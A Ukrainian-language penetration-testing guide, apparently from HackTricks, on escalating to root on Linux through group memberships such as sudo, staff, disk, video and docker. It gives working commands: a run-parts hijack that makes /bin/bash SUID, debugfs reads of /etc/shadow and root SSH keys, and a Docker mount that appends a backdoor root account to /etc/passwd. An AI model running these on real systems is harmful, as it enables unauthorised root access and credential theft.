# Цікаві групи - Linux Privesc

## Групи Sudo/Admin

### **PE - Method 1**

**Іноді** політика **/etc/sudoers** системи (або файл, підключений із неї) містить такі записи:<sup>[[3]](#references)</sup>
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Це означає, що будь-який користувач, який відповідає будь-якому з цих записів, може виконати будь-яку команду від імені будь-якого цільового користувача через `sudo` (з урахуванням решти політики).<sup>[[3]](#references)</sup>

Якщо це так, щоб **стати root, достатньо виконати**:
```
sudo su
```
### PE - Метод 2

Знайдіть усі suid-бінарні файли та перевірте, чи є серед них бінарний файл **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Якщо **pkexec є SUID-бінарним файлом**, він може виконати програму від імені іншого користувача лише тоді, коли polkit авторизує запитану дію; сам біт SUID не гарантує права root. Перевірте встановлену політику та авторизацію цільового сеансу, замість того щоб припускати, що членства в **sudo** або **admin** достатньо.<sup>[[4]](#references)[[5]](#references)</sup>

У дистрибутивах, які все ще використовують старий backend Local Authority, перевірте його правила для груп за допомогою:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Відповідні назви груп і значення за замовчуванням відрізняються залежно від дистрибутива; група корисна тут лише тоді, коли локальна політика її називає.<sup>[[5]](#references)</sup>

Щоб **отримати права root, можна виконати**:
```bash
pkexec "/bin/sh" #Authentication is required according to the local policy
```
Якщо ви спробуєте виконати **pkexec** і отримаєте цю **помилку**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
Під час SSH-сеансу без зареєстрованого authentication agent `pkexec` може завершитися з цією помилкою, навіть якщо policy в іншому разі дозволяла б виконання дії; polkit описує `pkttyagent` як text authentication agent для non-desktop sessions. Точна поведінка залежить від версії та дистрибутива, тому перевірте локальну policy і налаштування agent. Для деяких версій NixOS повідомляється про workaround із використанням **2 різних SSH-сеансів**.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Група Wheel

Іноді політика sudoers також може містити такий запис:
```
%wheel	ALL=(ALL:ALL) ALL
```
Це означає, що будь-який користувач, якому відповідає цей запис, може виконати будь-яку команду від імені будь-якого цільового користувача через `sudo` (з урахуванням решти політики).<sup>[[3]](#references)</sup>

Якщо це так, щоб **стати root, можна просто виконати**:
```
sudo su
```
## Shadow Group

У системах, де це дозволено налаштуваннями прав доступу, користувачі групи **shadow** можуть **читати** **/etc/shadow**; перевірте фактичний режим доступу та ACL на цільовій системі:<sup>[[6]](#references)[[7]](#references)</sup>
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Отже, прочитайте файл і спробуйте **зламати деякі хеші**.

Короткий нюанс щодо стану блокування під час аналізу хешів:
- Записи з `!` або `*` зазвичай не дають змоги виконувати інтерактивний вхід за паролем.
- `!hash` означає, що пароль заблоковано; решта символів відповідає значенню поля пароля до його блокування.
- Поле, що містить `*`, не є дійсним хешем `crypt(3)` і запобігає входу за UNIX-паролем; не робіть із цього висновок, чи було раніше встановлено пароль.
Це корисно для класифікації облікових записів, навіть коли прямий вхід заблоковано.<sup>[[6]](#references)</sup>

## Група Staff

**staff**: Дозволяє користувачам додавати локальні зміни до системи (`/usr/local`) без привілеїв root (зверніть увагу, що виконувані файли в `/usr/local/bin` містяться у змінній PATH будь-якого користувача, і вони можуть «перевизначати» виконувані файли в `/bin` та `/usr/bin` з таким самим іменем). Порівняйте з групою «adm», яка більше пов’язана з моніторингом і безпекою.<sup>[[2]](#references)[[7]](#references)</sup>

У конфігураціях Debian, де `/usr/local/bin` розташований перед `/usr/bin` у `PATH` (як у наведених нижче прикладах), некваліфікована команда спочатку знаходить копію в `/usr/local/bin`; перевірте фактичний `PATH` на цільовій системі.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Якщо привілейований процес знаходить некваліфіковану команду через доступний для запису `/usr/local/bin`, підміна цієї команди може забезпечити її виконання з привілеями процесу; перед тестуванням підтвердьте фактичний шлях і тригер.

У системах Ubuntu `pam_motd` під час входу виконує виконувані скрипти через `run-parts --lsbsysinit` від імені root; cron-завдання також можуть використовувати `run-parts`, але це залежить від дистрибутива та конфігурації.<sup>[[10]](#references)[[11]](#references)</sup>
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
Під час нового входу через SSH `pspy` може допомогти підтвердити, чи справді цей шлях викликається на цільовій системі; він може спостерігати за командними рядками процесів без root.<sup>[[10]](#references)[[12]](#references)</sup>
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Група disk

Членство в групі **disk** може надавати прямий доступ до блокових пристроїв і часто бути **майже еквівалентним доступу root**; Debian описує це як здебільшого еквівалентне root, але перевірте фактичні дозволи на пристрої та структуру сховища на цільовій системі.<sup>[[7]](#references)</sup>

Поширені шляхи до пристроїв включають `/dev/sd*`, але NVMe та інші структури сховищ використовують інші назви.
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
`debugfs` працює з файловими системами ext2/ext3/ext4; наведені вище шляхи `/root` і `/etc/shadow` є файлами всередині відкритої файлової системи, тоді як другий аргумент `dump` є шляхом виведення у власній файловій системі.<sup>[[8]](#references)</sup> Наприклад, це витягує `/tmp/asd1.txt` з відкритої файлової системи до `/tmp/asd2.txt` у власній файловій системі:
```bash
debugfs /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Параметр `-w` відкриває файлову систему для читання й запису, а команда `write` копіює локальний файл у відкриту файлову систему. Не використовуйте його на змонтованій активній файловій системі, оскільки пряме редагування може пошкодити файлову систему; за можливості працюйте з автономним образом.<sup>[[8]](#references)</sup>
```bash
debugfs -w /dev/sda1
debugfs:  write /tmp/asd1.txt /tmp/asd2.txt
```
## Група Video

За допомогою команди `w` можна дізнатися, **хто увійшов до системи**, і вона покаже результат на кшталт наведеного нижче.<sup>[[20]](#references)</sup>
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
Запис **tty1** ідентифікує першу віртуальну консоль Linux; сам по собі він не доводить фізичну присутність користувача за машиною, особливо в контейнерах або інших середовищах.<sup>[[21]](#references)</sup>

У системах, де доступний для читання пристрій framebuffer, членство в групі **video** може надати доступ до цього пристрою. Інтерфейс Linux framebuffer описує `/dev/fb0` як доступний для читання пристрій пам’яті, вміст якого можна скопіювати для створення знімка екрана; шлях `/sys/class/graphics/fb0/virtual_size` доступний лише там, де присутній цей атрибут fbdev у sysfs, тому спочатку перевірте цільову систему.<sup>[[7]](#references)[[9]](#references)</sup>
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Якщо встановлена версія **GIMP** підтримує імпорт raw-даних, відкрийте **`screen.raw`** за допомогою цього імпортера; підтримка та доступні елементи керування відрізняються залежно від версії та plug-in.<sup>[[22]](#references)</sup>

![Група Disk - Група Video: Щоб відкрити raw-зображення, можна використати GIMP, вибрати файл screen.raw і вибрати тип файлу Raw image data](<../../../images/image (463).png>)

Встановіть для зображення Width і Height відповідно до геометрії framebuffer; спробуйте доступні формати пікселів/Image Types, доки результат не стане розбірливим.<sup>[[9]](#references)</sup>

![Група Disk - Група Video: Потім змініть Width і Height на ті, що використовуються на екрані, і перевірте різні Image Types (виберіть той, що найкраще відображає екран)](<../../../images/image (317).png>)

## Група root

Членство в групі **root** не надає UID root, але файли, що належать `root` і доступні для запису групі, усе ще можуть бути цікавими, якщо привілейовані служби або бібліотеки використовують їх. Перед тим як розглядати це як шлях до privilege-escalation, перевірте фактичні дозволи файлу та спосіб його використання.

**Перевірити, які файли можуть змінювати члени групи root**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Група Docker

Членство в групі `docker` надає доступ на рівні root до Docker daemon у стандартних rootful-інсталяціях. Оскільки bind mounts за замовчуванням доступні для читання та запису, користувач, який може керувати цим daemon, може змонтувати `/` хоста в container і змінювати файли хоста; фактично це надає root-доступ до хоста.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bash
```
Нарешті, якщо вам не подобаються жодні з наведених раніше пропозицій або вони з якоїсь причини не працюють (docker api firewall?), ви завжди можете спробувати **запустити привілейований контейнер і виконати escape з нього**, як описано тут:

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

Якщо у вас є права на запис до docker socket, прочитайте [**цей пост про те, як підвищити привілеї, зловживаючи docker socket**](../../1-linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**.**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd Group

{{#ref}}
./
{{#endref}}

## Adm Group

Зазвичай **члени** групи **`adm`** мають дозволи на **читання log**-файлів, розташованих у _/var/log/_.\
Тому, якщо ви скомпрометували користувача, який входить до цієї групи, вам безумовно слід **переглянути log-файли**.<sup>[[7]](#references)</sup>

## Backup / Operator / lp / Mail groups

Ці групи мають значення, специфічні для сервісів і дистрибутивів. Debian описує `backup` для делегованого backup/restore, `lp` для printer daemons, а `mail` для `/var/mail`, тому перед тим, як розглядати членство в них як шлях до підвищення привілеїв, перевірте локальні дозволи.<sup>[[7]](#references)</sup>

Вони часто є векторами **пошуку облікових даних**, а не безпосередніми шляхами до root:
- **backup**: може надавати доступ до архівів із конфігураціями, ключами, DB dumps або токенами.
- **operator**: специфічний для платформи операційний доступ, який може спричинити leak конфіденційних даних під час роботи системи.
- **lp**: print queues/spools можуть містити вміст документів.
- **mail**: mail spools можуть розкривати посилання для скидання пароля, OTP і внутрішні облікові дані.

Розглядайте членство в цих групах як знахідку з високою цінністю щодо витоку даних і виконуйте pivot через повторне використання паролів/токенів.

## Auth group

В OpenBSD, коли налаштовано S/Key, файл `/etc/skey` належить `root:auth`, а доступ до його записів вимагає членства в групі `auth`; записи YubiKey зберігаються в `/var/db/yubikey`.<sup>[[16]](#references)[[17]](#references)</sup> Вразлива конфігурація OpenBSD 6.6 із увімкненим S/Key або YubiKey дозволяла локальним користувачам із привілеями `auth` стати root; Qualys документує необхідні умови та ланцюжок exploit, а пов’язаний PoC його реалізує.<sup>[[18]](#references)[[19]](#references)</sup>

## References

- [1] [Автентифікація pkexec/pkttyagent без GUI-сеансу (проблема NixOS #18012)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [Системні групи — Debian Wiki](https://wiki.debian.org/SystemGroups)
- [3] [sudoers(5) — sudo — сторінки довідки Debian](https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html)
- [4] [pkexec — довідковий посібник polkit](https://polkit.pages.freedesktop.org/polkit/pkexec.1.html)
- [5] [polkit — довідковий посібник polkit](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)
- [6] [shadow(5) — сторінка посібника Linux](https://man7.org/linux/man-pages/man5/shadow.5.html)
- [7] [Посібник із захисту Debian](https://www.debian.org/doc/manuals/securing-debian-manual/securing-debian-manual.en.pdf)
- [8] [debugfs(8) — сторінка посібника Linux](https://www.man7.org/linux/man-pages/man8/debugfs.8.html)
- [9] [Пристрій кадрового буфера — документація ядра Linux](https://docs.kernel.org/fb/framebuffer.html)
- [10] [update-motd(5) — сторінки довідки Ubuntu](https://manpages.ubuntu.com/manpages/resolute/man5/update-motd.5.html)
- [11] [run-parts(8) — сторінки довідки Debian](https://manpages.debian.org/unstable/debianutils/run-parts.8.en.html)
- [12] [pspy — непідтверджене privilege snooping процесів Linux](https://github.com/DominicBreuker/pspy)
- [13] [Безпека Docker Engine](https://docs.docker.com/engine/security/)
- [14] [Керування Docker як користувач без root](https://docs.docker.com/engine/install/linux-postinstall)
- [15] [Запуск контейнерів — документація Docker](https://docs.docker.com/engine/containers/run/)
- [16] [skey(5) — сторінки посібника OpenBSD](https://man.openbsd.org/skey.5)
- [17] [login_yubikey(8) — сторінки посібника OpenBSD](https://man.openbsd.org/login_yubikey.8)
- [18] [Вразливості автентифікації в OpenBSD — рекомендації з безпеки Qualys](https://www.openwall.com/lists/oss-security/2019/12/04/5)
- [19] [openbsd-authroot — локальний exploit PoC](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
- [20] [w(1) — сторінка посібника Linux](https://man7.org/linux/man-pages/man1/w.1.html)
- [21] [Виділені пристрої Linux (версія 4.x+)](https://docs.kernel.org/6.16/admin-guide/devices.html)
- [22] [Імпорт та експорт зображень — документація GIMP](https://docs.gimp.org/3.0/en/gimp-prefs-import-export.html)
{{#include ../../../banners/hacktricks-training.md}}
